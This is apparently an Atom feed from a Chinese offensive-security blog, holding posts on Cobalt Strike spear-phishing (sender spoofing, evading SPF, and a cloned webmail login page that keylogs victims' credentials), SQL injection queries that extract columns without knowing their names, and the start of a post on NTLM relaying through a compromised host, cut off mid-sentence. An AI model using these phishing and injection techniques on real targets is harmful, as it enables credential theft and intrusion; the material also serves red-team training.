<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Evi1cg&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://evi1cg.github.io/"/>
  <updated>2019-09-06T09:17:44.155Z</updated>
  <id>https://evi1cg.github.io/</id>
  
  <author>
    <name>Evi1cg</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>不点我就弹弹弹</title>
    <link href="https://evi1cg.github.io/archives/popups_advanced_maldoc.html"/>
    <id>https://evi1cg.github.io/archives/popups_advanced_maldoc.html</id>
    <published>2019-09-06T06:49:51.000Z</published>
    <updated>2019-09-06T09:17:44.155Z</updated>
    
    <content type="html"><![CDATA[<div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="输入密码，查看文章。" />    <label for="pass">输入密码，查看文章。</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display:none;">Incorrect Password!</div><div id="noContentError" style="display:none;">No content to display!</div><div id="encrypt-blog" style="display:none">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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      这是一篇加密文章，内容可能暂时还不想发出来。如果你确实想看，请与我联系。&lt;/br&gt;
    
    </summary>
    
    
      <category term="phishing" scheme="https://evi1cg.github.io/tags/phishing/"/>
    
      <category term="macro" scheme="https://evi1cg.github.io/tags/macro/"/>
    
  </entry>
  
  <entry>
    <title>Cobalt Strike Spear Phish</title>
    <link href="https://evi1cg.github.io/archives/spear_phish.html"/>
    <id>https://evi1cg.github.io/archives/spear_phish.html</id>
    <published>2019-06-05T08:08:34.000Z</published>
    <updated>2019-06-05T09:27:07.918Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/usr/uploads/2019/15597224054660.jpg" alt=""></p><a id="more"></a><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>关于Spear phish 和发件人伪造的工具有很多个，比如<a href="https://getgophish.com/" target="_blank" rel="noopener">gophish</a>、<a href="https://github.com/lunarca/SimpleEmailSpoofer" target="_blank" rel="noopener">SimpleEmailSpoofer</a>、命令行工具swaks等，每个工具都有其特点，当然Cobalt Strike也有此功能。官方介绍<a href="https://cobaltstrike.com/help-spear-phish" target="_blank" rel="noopener">戳我</a>。今天主要来介绍一下CS里面的此功能怎么使用。</p><h2 id="0x01-CS-Spear-Phish"><a href="#0x01-CS-Spear-Phish" class="headerlink" title="0x01 CS Spear Phish"></a>0x01 CS Spear Phish</h2><p>CS的Spear Phish位置在：<br><img src="/usr/uploads/2019/15597229460786.jpg" alt="-w274"></p><p>一张图说明功能：<br><img src="/usr/uploads/2019/15597228740190.jpg" alt=""></p><p>使用此功能的前提是需要有一个smtp服务器来供我们来转发邮件，当然可以使用公共smtp服务，另外也可以参考<a href="https://evi1cg.github.io/archives/Email_spoofing.html">《Something about email spoofing》</a> 中提到的方法来搭建。<br>这里的使用很简单，首先构造目标列表，使用：<br><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mail    <span class="built_in">name</span></span><br><span class="line">mail    <span class="built_in">name</span></span><br></pre></td></tr></table></figure></p><blockquote><p>中间的分隔符为[tab],可以不添加name</p></blockquote><p>添加好以后就是这个样子：<br><img src="/usr/uploads/2019/15597237296089.jpg" alt="-w551"></p><p>下面，要配置发件模板，这里配置很简单，只需要复制一份原始邮件即可，比如一份密码重置邮件：<br><img src="/usr/uploads/2019/15597240250480.jpg" alt="-w1115"></p><p>选择显示原始邮件，并将其内容保存。</p><p>在这里如果要伪造发件人，需要修改<code>From:</code><br><img src="/usr/uploads/2019/15597241905750.jpg" alt="-w333"></p><p>否则就不需要做什么别的修改。之后，配置对应的<code>Mail server</code>，就可以进行发送邮件了，这里需要注意一点,为了绕过SPF的检查，<code>Bunce to</code>需设置为与<code>Mail server</code>同域，如<code>Mail server</code>为 <code>mail.evi1cg.me</code>,<code>Bunce to</code>可设置为<a href="mailto:`admin@evi1cg.me" target="_blank" rel="noopener">`admin@evi1cg.me</a>`。</p><p>之后点击<code>Send</code>则可发送邮件，收到的邮件与模板一致。<br><img src="/usr/uploads/2019/15597245409452.jpg" alt="-w991"></p><p>另外查看SRF为<code>PASS</code>状态：</p><p><img src="/usr/uploads/2019/15597249761870.jpg" alt="-w1062"></p><p>另外，CS也有发送附件的功能，但是原版本的CS发送附件有一个Bug，即如果附件为中文名称，则会在最后的邮件中显示乱码附件：<br><img src="/usr/uploads/2019/15597249044056.jpg" alt="-w1008"></p><p>所以在这里我们需要对CS动刀了，经过调试，成功定位到<code>mail\Eater.java</code>，需要对此类中的<code>createAttachment</code>方法进行修改：<br><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> BodyPart createAttachment(<span class="keyword">String</span> name) throws IOException &#123;</span><br><span class="line">   File file = <span class="keyword">new</span> <span class="type">File</span>(name);</span><br><span class="line">   <span class="keyword">String</span> namez = file.getName();</span><br><span class="line">   <span class="keyword">String</span> filename = <span class="keyword">new</span> <span class="type">String</span>(namez.getBytes(<span class="string">"utf-8"</span>),<span class="string">"ISO8859-1"</span>);</span><br><span class="line">   Body body = (<span class="keyword">new</span> <span class="type">StorageBodyFactory</span>()).binaryBody((InputStream)(<span class="keyword">new</span> <span class="type">FileInputStream</span>(name)));</span><br><span class="line">   Map temp = <span class="keyword">new</span> <span class="type">HashMap</span>();</span><br><span class="line">   temp.put(<span class="string">"name"</span>, filename);</span><br><span class="line">   BodyPart bodyPart = <span class="keyword">new</span> <span class="type">BodyPart</span>();</span><br><span class="line">   bodyPart.setBody(body, <span class="string">"application/octet-stream"</span>, temp);</span><br><span class="line">   bodyPart.setContentTransferEncoding(<span class="string">"base64"</span>);</span><br><span class="line">   bodyPart.setContentDisposition(<span class="string">"attachment"</span>);</span><br><span class="line">   bodyPart.setFilename(filename);</span><br><span class="line">   <span class="keyword">return</span> bodyPart;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这样就可以解决附件乱码问题了:<br><img src="/usr/uploads/2019/15597252411387.jpg" alt="-w1005"></p><h2 id="0x02-Web-clone"><a href="#0x02-Web-clone" class="headerlink" title="0x02 Web clone"></a>0x02 Web clone</h2><p>另外在这里还有一个与Web Clone结合的地方，首先，我们先Clone一个需登录的网站，如网易邮箱：<br><img src="/usr/uploads/2019/15597262318727.jpg" alt="-w409"></p><p>这里可以选择开启键盘记录功能。</p><p>开启Clone：<br><img src="/usr/uploads/2019/15597263501598.jpg" alt="-w276"></p><p>设置spear phish:<br><img src="/usr/uploads/2019/15597264046957.jpg" alt="-w981"></p><p>Embed URL选择刚刚克隆的url，发送邮件，此时用户点击重置按钮，则会跳转到Clone的站点：<br><img src="/usr/uploads/2019/mail.gif" alt="mai"></p><p>此时，用户输入会被记录：</p><p><img src="/usr/uploads/2019/keylog.gif" alt="keylog"></p><p>emmm. 大概就介绍这么多吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/usr/uploads/2019/15597224054660.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="工具收集" scheme="https://evi1cg.github.io/categories/%E5%B7%A5%E5%85%B7%E6%94%B6%E9%9B%86/"/>
    
    
      <category term="cobaltstrike" scheme="https://evi1cg.github.io/tags/cobaltstrike/"/>
    
      <category term="phishing" scheme="https://evi1cg.github.io/tags/phishing/"/>
    
  </entry>
  
  <entry>
    <title>不知道列名的情况下注入</title>
    <link href="https://evi1cg.github.io/archives/sqli_without_knowing_columns_names.html"/>
    <id>https://evi1cg.github.io/archives/sqli_without_knowing_columns_names.html</id>
    <published>2019-02-13T07:26:29.000Z</published>
    <updated>2019-02-13T08:15:32.095Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/usr/uploads/2019/15500455788558.jpg" alt="-w1225"></p><a id="more"></a><h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h2><p>在 mysql =&gt; 5 的版本中存在库<code>information_schema</code>,记录着mysql中所有表的结构，通常，在mysql sqli中，我们会通过此库中的表去获取其他表的结构，即表名，列名等。但是这个库也会经常被WAF过滤。当我们通过暴力破解获取到表名后，该如何进行下一步利用呢？</p><blockquote><p>在information_schema中，除了SCHEMATA，TABLES，COLUMNS有表信息外，高版本的mysql中，还有INNODB_TABLES及INNODB_COLUMNS中记录着表结构。</p></blockquote><h2 id="0x01-不使用表名查询"><a href="#0x01-不使用表名查询" class="headerlink" title="0x01 不使用表名查询"></a>0x01 不使用表名查询</h2><p>正常的查询如下：<br><img src="/usr/uploads/2019/15500437457634.jpg" alt="-w489"></p><p>其中，列名为<code>id</code>,<code>name</code>,<code>pass</code>,<code>mail</code>,<code>phone</code>，使用union查询<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500439319694.jpg" alt="-w502"></p><p>接着，就可以继续使用数字来对应列,如3对应了表里面的pass:<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">`3`</span> from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500441801262.jpg" alt="-w640"></p><p>当  ` 不能使用的时候，使用别名来代替：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> b from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">as</span> b,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span>;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500450275510.jpg" alt="-w713"></p><p>在注入中查询多个列：<br><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> concat(<span class="string">`2`</span>,<span class="number">0x3a</span>,<span class="string">`3`</span>) from (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span> <span class="class"><span class="keyword">union</span> <span class="title">select</span> * <span class="title">from</span> <span class="title">users</span>)<span class="title">a</span> <span class="title">limit</span> 1,1;</span></span><br></pre></td></tr></table></figure></p><p><img src="/usr/uploads/2019/15500443786658.jpg" alt="-w808"></p><p>FROM:<a href="https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/" target="_blank" rel="noopener">Extracting data without knowing columns names </a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/usr/uploads/2019/15500455788558.jpg&quot; alt=&quot;-w1225&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="奇技淫巧" scheme="https://evi1cg.github.io/categories/%E5%A5%87%E6%8A%80%E6%B7%AB%E5%B7%A7/"/>
    
    
      <category term="Sqli" scheme="https://evi1cg.github.io/tags/Sqli/"/>
    
  </entry>
  
  <entry>
    <title>Remote NTLM relaying through CS</title>
    <link href="https://evi1cg.github.io/archives/Remote_NTLM_relaying_through_CS.html"/>
    <id>https://evi1cg.github.io/archives/Remote_NTLM_relaying_through_CS.html</id>
    <published>2019-01-26T19:49:33.000Z</published>
    <updated>2019-01-28T05:07:17.762Z</updated>
    
    <content type="html"><![CDATA[<p> <img src="/usr/uploads/2019/15485575598334.jpg" alt="-w944"></p><a id="more"></a><h2 id="0x00-为什么写这个？"><a href="#0x00-为什么写这个？" class="headerlink" title="0x00 为什么写这个？"></a>0x00 为什么写这个？</h2><p>最近在学习Exchange在提权中的应用的时候，碰到一个问题，即：如果我们现在拥有了一个内网的windows主机，如何利用这台主机使用<a href="https://evi1cg.me/archives/Exchange_Privilege_Elevation.html" target="_blank" rel="noopener">CVE_2018_8581</a> ？大概的结构是这样：</p><p> <img src="/usr/uploads/2019/15485584490614.jpg" alt="-w944"></p><blockquote><p>攻击者通过某种方式获取一台域内主机权限。并获取了此主机的域成员账号密码，在获取DC及Exchange Server的ip地址后，利用CVE_2018_8581</p></blockquote><h2 id="0x01-利用思路"><a href="#0x01-利用思路" class="headerlink" title="0x01 利用思路"></a>0x01 利用思路</h2><h3 id="思路一：编译py版的impacket"><a href="#思路一：编译py版的impacket" class="headerlink" title="思路一：编译py版的impacket"></a>思路一：编译py版的impacket</h3><p>在做这个的时候，第一想法就是有没有windows下可用的impacket，后来找了找，还真有<a href="https://github.com/ropnop/impacket_static_binaries" target="_blank" rel="noopener">impacket_static_binaries</a>，于是就拿来用了。但是后来发现是有问题的。<br><del>首先，利用需要关闭win的445端口，这个就需要重启，这是我们非常不愿意做的，另外，似乎</del>win版的<code>ntlmrelayx</code> 和 <code>smbrelayx</code>还不能用。</p><p><img src="/usr/uploads/2019/15485595933128.jpg" alt="-w932"></p><p>所以直接放弃了。</p><h3 id="思路二：通过meterpreter进行NTLM-relaying"><a href="#思路二：通过meterpreter进行NTLM-relaying" class="headerlink" title="思路二：通过meterpreter进行NTLM relaying"></a>思路二：通过meterpreter进行NTLM relaying</h3><p>这个思路是之前看到的<a href="https://diablohorn.com/2018/08/25/remote-ntlm-relaying-through-meterpreter-on-windows-port-445/" target="_blank" rel="noopener">《Remote NTLM relaying through meterpreter on Windows port 445》</a>来的。在这篇文章里面，详细分析了是谁占用了445，如何进行转发再进行Remote NTLM 